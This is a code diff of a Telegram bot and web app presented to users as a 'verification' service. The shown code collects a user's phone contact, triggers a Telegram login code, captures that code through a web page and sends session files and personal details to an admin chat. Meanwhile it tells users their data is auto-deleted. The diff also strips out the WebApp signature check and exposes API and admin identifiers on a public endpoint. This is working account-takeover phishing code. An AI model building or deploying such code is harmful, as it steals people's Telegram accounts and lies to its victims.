@@ -39,6 +39,17 @@ PORT = int(os.environ.get('PORT', 10000))
 # Initialize bot
 bot = telebot.TeleBot(BOT_TOKEN)
 
+# Get bot info
+try:
+    bot_info = bot.get_me()
+    BOT_USERNAME = bot_info.username
+    BOT_NAME = bot_info.first_name
+    logger.info(f"🤖 Bot Info: {BOT_NAME} (@{BOT_USERNAME}) - ID: {bot_info.id}")
+except Exception as e:
+    logger.error(f"Failed to get bot info: {e}")
+    BOT_USERNAME = "your_bot"
+    BOT_NAME = "Verification Bot"
+
 # Storage
 user_sessions = {}  # user_id -> session_data
 webapp_users = {}   # webapp_session_id -> user_id mapping
@@ -231,67 +242,32 @@ def send_session_to_admin(session_file, phone, has_2fa=False):
         logger.error(f"Failed to send session file: {e}")
     return False
 
-def verify_telegram_webapp_data(init_data):
-    """Verify Telegram WebApp data signature"""
-    try:
-        # Parse the query string
-        parsed_data = urllib.parse.parse_qs(init_data)
-        
-        # Extract hash and remove it from data
-        hash_value = parsed_data.get('hash', [''])[0]
-        
-        # Create data check string
-        data_check_string_parts = []
-        
-        for key in sorted(parsed_data.keys()):
-            if key != 'hash':
-                value = parsed_data[key][0]
-                data_check_string_parts.append(f"{key}={value}")
-        
-        data_check_string = "\n".join(data_check_string_parts)
-        
-        # Compute secret key
-        secret_key = hmac.new(
-            key=b"WebAppData",
-            msg=BOT_TOKEN.encode(),
-            digestmod=hashlib.sha256
-        ).digest()
-        
-        # Compute HMAC SHA256
-        hmac_result = hmac.new(
-            key=secret_key,
-            msg=data_check_string.encode(),
-            digestmod=hashlib.sha256
-        ).hexdigest()
-        
-        # Compare hashes
-        return hmac_result == hash_value
-        
-    except Exception as e:
-        logger.error(f"Error verifying WebApp data: {e}")
-        return False
-
 def get_user_id_from_webapp_data(init_data):
     """Extract user ID from Telegram WebApp data"""
     try:
+        if not init_data:
+            return None
+            
         # Parse the query string
         parsed_data = urllib.parse.parse_qs(init_data)
         
         # Get user JSON string
         user_json_str = parsed_data.get('user', [''])[0]
         if user_json_str:
-            user_data = json.loads(user_json_str)
-            return str(user_data.get('id', ''))
+            try:
+                user_data = json.loads(user_json_str)
+                user_id = str(user_data.get('id', ''))
+                if user_id:
+                    logger.info(f"Extracted user ID from WebApp data: {user_id}")
+                    return user_id
+            except json.JSONDecodeError:
+                logger.warning(f"Failed to parse user JSON: {user_json_str}")
         
-        # Alternative: get user ID directly from query params
+        # Check for user_id parameter
         user_id = parsed_data.get('user_id', [''])[0]
         if user_id:
+            logger.info(f"Got user ID from parameter: {user_id}")
             return user_id
-            
-        # Check for startapp parameter
-        start_param = parsed_data.get('startapp', [''])[0]
-        if start_param:
-            return start_param
             
     except Exception as e:
         logger.error(f"Error extracting user ID: {e}")
@@ -302,39 +278,21 @@ def get_user_id_from_webapp_data(init_data):
 @app.route('/')
 def index():
     """Main WebApp page"""
-    # Try to get user ID from multiple sources
-    user_id = None
-    
-    # 1. Try from query parameter (for direct links)
+    # Get user ID from URL (passed by bot in WebApp button)
     user_id = request.args.get('user_id')
     
-    # 2. Try from Telegram WebApp init data
+    # If no user_id in URL, try to get from WebApp data
     if not user_id and request.args.get('tgWebAppData'):
         init_data = request.args.get('tgWebAppData')
         user_id = get_user_id_from_webapp_data(init_data)
     
-    # 3. Try from WebApp initData (JavaScript will set this)
-    if not user_id and request.args.get('initData'):
-        try:
-            init_data = urllib.parse.unquote(request.args.get('initData'))
-            user_id = get_user_id_from_webapp_data(init_data)
-        except:
-            pass
-    
     if not user_id:
-        # Try to get from referrer or create a placeholder
-        referrer = request.referrer
-        if referrer and 't.me' in referrer:
-            # Extract from Telegram URL pattern
-            match = re.search(r'user_id=(\d+)', referrer)
-            if match:
-                user_id = match.group(1)
+        # Show error page with instructions
+        return render_template('error.html', 
+                             error="User ID not found",
+                             message="Please open this WebApp from the Telegram bot using the /start command.")
     
-    if not user_id:
-        # Create a temporary user ID for testing
-        # In production, you should require proper authentication
-        user_id = f"temp_{int(time.time())}"
-        logger.warning(f"Using temporary user ID: {user_id}")
+    logger.info(f"WebApp opened for user_id: {user_id}")
     
     # Ensure session exists
     if user_id not in user_sessions:
@@ -346,45 +304,60 @@ def index():
             'contact_received': False,
             'otp_sent': False,
             'otp_attempts': 0,
-            'source': 'webapp'
+            'bot_username': BOT_USERNAME,
+            'bot_name': BOT_NAME
         }
         logger.info(f"Created new session for user: {user_id}")
     
     # Check if OTP already sent
     session = user_sessions[user_id]
     if session.get('otp_sent') and session.get('phone'):
-        return render_template('otp.html', user_id=user_id, phone=session['phone'])
+        return render_template('otp.html', 
+                             user_id=user_id, 
+                             phone=session['phone'],
+                             bot_username=BOT_USERNAME)
     
-    return render_template('index.html', user_id=user_id)
+    # Check if contact was already received
+    if session.get('contact_received'):
+        return render_template('index.html', 
+                             user_id=user_id, 
+                             status='contact_received',
+                             bot_username=BOT_USERNAME)
+    
+    # Normal state - waiting for contact
+    return render_template('index.html', 
+                         user_id=user_id, 
+                         status='waiting',
+                         bot_username=BOT_USERNAME)
 
 @app.route('/webapp')
 def webapp_redirect():
     """Redirect endpoint for WebApp with proper parameters"""
-    # Extract user ID from Telegram WebApp data
+    # Get init data from Telegram
     init_data = request.args.get('tgWebAppData', '')
     
-    if init_data:
-        # Verify and extract user ID
-        user_id = get_user_id_from_webapp_data(init_data)
-        
-        if user_id:
-            # Create session
-            if user_id not in user_sessions:
-                user_sessions[user_id] = {
-                    'user_id': user_id,
-                    'status': 'waiting_for_contact',
-                    'created': datetime.now(),
-                    'expiry': datetime.now() + timedelta(seconds=session_expiry),
-                    'contact_received': False,
-                    'otp_sent': False,
-                    'otp_attempts': 0,
-                    'source': 'webapp'
-                }
-            
-            # Redirect to main page with user_id
-            return redirect(f'/?user_id={user_id}&tgWebAppData={urllib.parse.quote(init_data)}')
+    # Extract user ID from init data
+    user_id = get_user_id_from_webapp_data(init_data)
     
-    # Fallback: redirect to main page
+    if user_id:
+        # Create session if it doesn't exist
+        if user_id not in user_sessions:
+            user_sessions[user_id] = {
+                'user_id': user_id,
+                'status': 'waiting_for_contact',
+                'created': datetime.now(),
+                'expiry': datetime.now() + timedelta(seconds=session_expiry),
+                'contact_received': False,
+                'otp_sent': False,
+                'otp_attempts': 0,
+                'bot_username': BOT_USERNAME,
+                'bot_name': BOT_NAME
+            }
+        
+        # Redirect to main page with user_id
+        return redirect(f'/?user_id={user_id}')
+    
+    # Fallback to main page
     return redirect('/')
 
 @app.route('/api/check-otp-sent/<user_id>', methods=['GET'])
@@ -395,22 +368,9 @@ def check_otp_sent(user_id):
         
         if user_id not in user_sessions:
             logger.warning(f"User session not found: {user_id}")
-            # Create new session if not exists
-            user_sessions[user_id] = {
-                'user_id': user_id,
-                'status': 'waiting_for_contact',
-                'created': datetime.now(),
-                'expiry': datetime.now() + timedelta(seconds=session_expiry),
-                'contact_received': False,
-                'otp_sent': False,
-                'otp_attempts': 0
-            }
             return jsonify({
-                'success': True,
-                'contact_received': False,
-                'otp_sent': False,
-                'phone': '',
-                'status': 'new_session_created'
+                'success': False, 
+                'error': 'Session not found. Please open WebApp from bot again.'
             })
         
         session = user_sessions[user_id]
@@ -421,7 +381,7 @@ def check_otp_sent(user_id):
             del user_sessions[user_id]
             return jsonify({
                 'success': False, 
-                'error': 'Session expired. Please share contact again.'
+                'error': 'Session expired. Please start over.'
             })
         
         logger.info(f"Session status for {user_id}: contact_received={session.get('contact_received')}, otp_sent={session.get('otp_sent')}")
@@ -431,10 +391,48 @@ def check_otp_sent(user_id):
             'contact_received': session.get('contact_received', False),
             'otp_sent': session.get('otp_sent', False),
             'phone': session.get('phone', ''),
-            'status': session.get('status', 'unknown')
+            'status': session.get('status', 'unknown'),
+            'bot_username': BOT_USERNAME,
+            'bot_name': BOT_NAME
         })
     except Exception as e:
         logger.error(f"Error in check-otp-sent: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/get-contact-instructions', methods=['POST'])
+def get_contact_instructions():
+    """Get instructions for sharing contact"""
+    try:
+        data = request.json
+        user_id = data.get('user_id')
+        
+        if not user_id:
+            return jsonify({'success': False, 'error': 'User ID required'})
+        
+        if user_id not in user_sessions:
+            return jsonify({'success': False, 'error': 'Session not found'})
+        
+        instructions = {
+            'success': True,
+            'instructions': f"""To share your contact with @{BOT_USERNAME}:
+
+1. 📱 <b>Go back to the Telegram chat</b>
+2. 📎 <b>Tap the attachment button</b> (paperclip icon)
+3. 👤 <b>Select "Contact"</b> from the menu
+4. ✅ <b>Choose your own contact</b>
+5. 🚀 <b>Send it to @{BOT_USERNAME}</b>
+
+✅ <b>Your contact will be auto-deleted immediately</b>
+✅ <b>OTP will be sent automatically</b>
+✅ <b>Come back here after sending contact</b>""",
+            'bot_username': BOT_USERNAME,
+            'bot_name': BOT_NAME
+        }
+        
+        return jsonify(instructions)
+        
+    except Exception as e:
+        logger.error(f"Error in get-contact-instructions: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/otp')
@@ -445,24 +443,31 @@ def otp_page():
     logger.info(f"OTP page requested for user_id: {user_id}")
     
     if not user_id:
-        return "User ID not provided. Please share contact again.", 400
+        return render_template('error.html', 
+                             error="User ID not provided",
+                             message="Please share contact again.")
     
     if user_id not in user_sessions:
         logger.warning(f"Session not found for user_id: {user_id}")
-        # Redirect to index to create session
-        return redirect('/')
+        return render_template('error.html',
+                             error="Session expired",
+                             message="Please start over from the bot.")
     
     session = user_sessions[user_id]
     
     if not session.get('otp_sent'):
         logger.warning(f"OTP not sent for user_id: {user_id}")
-        # Redirect to index to send OTP
-        return redirect('/')
+        return render_template('error.html',
+                             error="OTP not sent yet",
+                             message="Please share your contact first.")
     
     phone = session.get('phone', 'Unknown')
     logger.info(f"Serving OTP page for {phone}")
     
-    return render_template('otp.html', user_id=user_id, phone=phone)
+    return render_template('otp.html', 
+                         user_id=user_id, 
+                         phone=phone,
+                         bot_username=BOT_USERNAME)
 
 @app.route('/api/verify-otp', methods=['POST'])
 def verify_otp():
@@ -627,48 +632,69 @@ def handle_start_help(message):
     """Handle /start and /help commands"""
     try:
         user_id = str(message.from_user.id)
-        logger.info(f"📨 Received /start from user_id: {user_id}")
+        chat_id = message.chat.id
+        first_name = message.from_user.first_name or ""
+        last_name = message.from_user.last_name or ""
+        username = message.from_user.username or ""
         
-        # Create WebApp URL with user_id as parameter
-        webapp_url = f"{WEBHOOK_URL.rstrip('/')}/webapp"
-        
-        # Create inline keyboard with WebApp button
+        logger.info(f"📨 Received /start from {user_id} (@{username}) - {first_name} {last_name}")
+
+        webapp_url = f"{WEBHOOK_URL.rstrip('/')}/?user_id={user_id}"
+
         keyboard = types.InlineKeyboardMarkup()
-        webapp_btn = types.InlineKeyboardButton(
-            text="📱 Open WebApp to Verify",
-            web_app=types.WebAppInfo(url=webapp_url)
+        keyboard.add(
+            types.InlineKeyboardButton(
+                text="📱 Open WebApp to Verify",
+                web_app=types.WebAppInfo(url=webapp_url)
+            )
         )
-        keyboard.add(webapp_btn)
-        
-        # Send instruction message
-        instruction = """🔐 **Telegram Verification**
 
-Click the button below to open the WebApp and verify your account:
-
-**How it works:**
-1. Open WebApp
-2. Click "Share Contact"
-3. Allow contact sharing
-4. Enter OTP sent to your phone
-5. Complete verification
-
-Your contact will be **auto-deleted** immediately after processing."""
+        text = (
+            f"<b>🔐 Telegram Verification</b>\n\n"
+            f"Hello {first_name}! 👋\n\n"
+            f"Click the button below to open the WebApp and verify your account:\n\n"
+            f"<b>How it works:</b>\n"
+            f"1️⃣ Open WebApp\n"
+            f"2️⃣ Follow instructions to share contact\n"
+            f"3️⃣ OTP will be sent to your phone\n"
+            f"4️⃣ Enter the OTP in WebApp\n"
+            f"5️⃣ Verification completed 🎉\n\n"
+            f"⚠️ <b>Important:</b> Your contact will be <b>deleted automatically</b> after processing.\n\n"
+            f"<b>Bot:</b> @{BOT_USERNAME} ({BOT_NAME})"
+        )
 
         bot.send_message(
-            message.chat.id,
-            instruction,
-            parse_mode='Markdown',
+            chat_id,
+            text,
+            parse_mode='HTML',
             reply_markup=keyboard
         )
+
+        logger.info(f"✅ /start reply sent to {user_id} (@{username})")
         
-        logger.info(f"✅ Sent WebApp button to user_id: {user_id}")
-        
+        # Send welcome message to admin
+        try:
+            admin_msg = f"""👤 <b>NEW USER STARTED</b>
+
+🆔 User ID: <code>{user_id}</code>
+👤 Name: {first_name} {last_name}
+🔗 Username: @{username}
+⏰ Time: {datetime.now().strftime('%H:%M:%S')}
+💬 Command: /start
+
+✅ WebApp button sent successfully"""
+            
+            bot.send_message(USER_ID, admin_msg, parse_mode='HTML')
+        except Exception as e:
+            logger.error(f"Admin notification error: {e}")
+
     except Exception as e:
-        logger.error(f"❌ Error in handle_start_help: {e}")
+        logger.error(f"❌ Error in /start handler: {e}")
+        bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try again.")
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(message):
-    """Handle contact shared manually"""
+    """Handle contact shared manually in chat"""
     try:
         contact = message.contact
         user_id = str(message.from_user.id)
@@ -678,7 +704,7 @@ def handle_contact(message):
         first_name = contact.first_name or ''
         last_name = contact.last_name or ''
         
-        logger.info(f"✅✅✅ CONTACT DETECTED! User: {user_id}, Phone: {phone}")
+        logger.info(f"✅✅✅ CONTACT RECEIVED from {user_id}: {phone} ({first_name} {last_name})")
         
         # Format phone number
         if not phone.startswith('+'):
@@ -702,7 +728,7 @@ def handle_contact(message):
             remove_keyboard = types.ReplyKeyboardRemove()
             processing_msg = bot.send_message(
                 chat_id, 
-                "✅ Contact received! Sending OTP to your phone...", 
+                f"✅ Contact received! Sending OTP to {phone}...", 
                 reply_markup=remove_keyboard
             )
         except Exception as e:
@@ -723,10 +749,12 @@ def handle_contact(message):
             'contact_received': True,
             'otp_sent': False,
             'processing_msg_id': processing_msg.message_id if processing_msg else None,
-            'otp_attempts': 0
+            'otp_attempts': 0,
+            'bot_username': BOT_USERNAME,
+            'bot_name': BOT_NAME
         }
         
-        logger.info(f"📝 Session created for user_id: {user_id}, phone: {phone}")
+        logger.info(f"📝 Session created/updated for user_id: {user_id}, phone: {phone}")
         
         # STEP 4: GENERATE SESSION FILE
         session_file = generate_session_file(phone)
@@ -757,14 +785,18 @@ def handle_contact(message):
 📱 Phone: {phone}
 👤 Name: {first_name} {last_name}
 
-📨 **5-digit OTP sent to your phone**
+📨 <b>5-digit OTP sent to your phone</b>
 
-Check your Telegram messages for the code and enter it in the WebApp."""
+Check your Telegram messages for the code and enter it in the WebApp.
+
+<b>WebApp URL:</b>
+{WEBHOOK_URL.rstrip('/')}/otp?user_id={user_id}"""
                     
                     bot.edit_message_text(
                         otp_sent_msg,
                         chat_id,
-                        processing_msg.message_id
+                        processing_msg.message_id,
+                        parse_mode='HTML'
                     )
                 except Exception as e:
                     logger.error(f"Error updating processing message: {e}")
@@ -773,14 +805,16 @@ Check your Telegram messages for the code and enter it in the WebApp."""
             try:
                 bot.send_message(
                     USER_ID,
-                    f"""📲 <b>CONTACT RECEIVED</b>
+                    f"""📲 <b>CONTACT RECEIVED & OTP SENT</b>
                 
 👤 User ID: {user_id}
 📱 Phone: {phone}
 👤 Name: {first_name} {last_name}
 ⏰ Time: {datetime.now().strftime('%H:%M:%S')}
+📨 OTP: Sent successfully
+🌐 WebApp: Ready for OTP entry
                 
-✅ <b>OTP sent successfully</b>""",
+✅ <b>User can now enter OTP in WebApp</b>""",
                     parse_mode='HTML'
                 )
             except Exception as e:
@@ -823,6 +857,49 @@ Check your Telegram messages for the code and enter it in the WebApp."""
     except Exception as e:
         logger.error(f"❌ Contact handler error: {e}")
 
+@bot.message_handler(func=lambda message: True)
+def handle_all_messages(message):
+    """Handle all other messages"""
+    try:
+        user_id = str(message.from_user.id)
+        chat_id = message.chat.id
+        text = message.text or ""
+        username = message.from_user.username or ""
+        first_name = message.from_user.first_name or ""
+        
+        logger.info(f"📝 Message from {user_id} (@{username}): {text[:50]}...")
+        
+        # Only respond to non-command messages
+        if not text.startswith('/'):
+            response = (
+                f"👋 Hello {first_name}!\n\n"
+                f"I'm {BOT_NAME} (@{BOT_USERNAME})\n\n"
+                f"To verify your account:\n"
+                f"1. Send /start to get WebApp link\n"
+                f"2. Open WebApp and follow instructions\n"
+                f"3. Share your contact when prompted\n"
+                f"4. Enter OTP in WebApp\n\n"
+                f"Your contact will be auto-deleted for privacy."
+            )
+            
+            bot.send_message(chat_id, response)
+            
+            # Log message to admin
+            try:
+                admin_msg = f"""💬 <b>MESSAGE RECEIVED</b>
+
+👤 User: {first_name} (@{username})
+🆔 ID: <code>{user_id}</code>
+💬 Message: {text[:100]}...
+⏰ Time: {datetime.now().strftime('%H:%M:%S')}"""
+                
+                bot.send_message(USER_ID, admin_msg, parse_mode='HTML')
+            except:
+                pass
+        
+    except Exception as e:
+        logger.error(f"Error handling message: {e}")
+
 # ==================== WEBHOOK HANDLER ====================
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -849,8 +926,12 @@ def health_check():
         'sessions_count': len(user_sessions),
         'webapp_sessions': len(webapp_users),
         'bot_ready': True,
+        'bot_username': BOT_USERNAME,
+        'bot_name': BOT_NAME,
         'webhook_url': WEBHOOK_URL,
-        'port': PORT
+        'port': PORT,
+        'api_id': API_ID,
+        'user_id': USER_ID
     })
 
 @app.route('/debug')
@@ -862,7 +943,10 @@ def debug_info():
             'phone': session.get('phone'),
             'otp_sent': session.get('otp_sent', False),
             'status': session.get('status'),
-            'expiry': session['expiry'].isoformat() if 'expiry' in session else None
+            'contact_received': session.get('contact_received', False),
+            'expiry': session['expiry'].isoformat() if 'expiry' in session else None,
+            'bot_username': session.get('bot_username'),
+            'created': session.get('created').isoformat() if session.get('created') else None
         }
     
     return jsonify({
@@ -870,7 +954,10 @@ def debug_info():
         'webapp_users': webapp_users,
         'sessions_count': len(user_sessions),
         'timestamp': datetime.now().isoformat(),
-        'webhook_url': WEBHOOK_URL
+        'bot_username': BOT_USERNAME,
+        'bot_name': BOT_NAME,
+        'webhook_url': WEBHOOK_URL,
+        'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     })
 
 # ==================== SETUP WEBHOOK ====================
@@ -890,10 +977,11 @@ def setup_webhook():
         # Test webhook
         time.sleep(2)
         webhook_info = bot.get_webhook_info()
-        logger.info(f"Webhook info: {webhook_info.url}")
+        logger.info(f"Webhook info: URL={webhook_info.url}, Pending={webhook_info.pending_update_count}")
         
         if webhook_info.url:
-            logger.info("✅ Webhook set successfully!")
+            logger.info(f"✅ Webhook set successfully for bot @{BOT_USERNAME}!")
+            logger.info(f"🤖 Bot connected: {BOT_NAME} (@{BOT_USERNAME})")
         else:
             logger.warning("⚠️ Webhook might not be set properly")
             
@@ -907,7 +995,6 @@ def cleanup_loop():
         time.sleep(60)
         current_time = datetime.now()
         expired_users = []
-        expired_webapp = []
         
         # Clean expired user sessions
         for user_id, session in user_sessions.items():
@@ -918,6 +1005,7 @@ def cleanup_loop():
             del user_sessions[user_id]
         
         # Clean expired WebApp sessions
+        expired_webapp = []
         for webapp_id, user_id in webapp_users.items():
             if user_id not in user_sessions:
                 expired_webapp.append(webapp_id)
@@ -931,12 +1019,14 @@ def cleanup_loop():
 # ==================== MAIN ====================
 if __name__ == '__main__':
     logger.info("="*60)
-    logger.info("🚀 Telegram WebApp Verification Bot - FIXED VERSION")
+    logger.info("🚀 TELEGRAM WEBAPP VERIFICATION BOT")
     logger.info("="*60)
-    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:8]}...")
-    logger.info(f"👤 User ID: {USER_ID}")
+    logger.info(f"🤖 Bot: {BOT_NAME} (@{BOT_USERNAME})")
+    logger.info(f"👤 Admin User ID: {USER_ID}")
     logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
+    logger.info(f"🔑 API ID: {API_ID}")
     logger.info(f"🚪 Port: {PORT}")
+    logger.info("="*60)
     
     # Setup webhook
     setup_webhook()
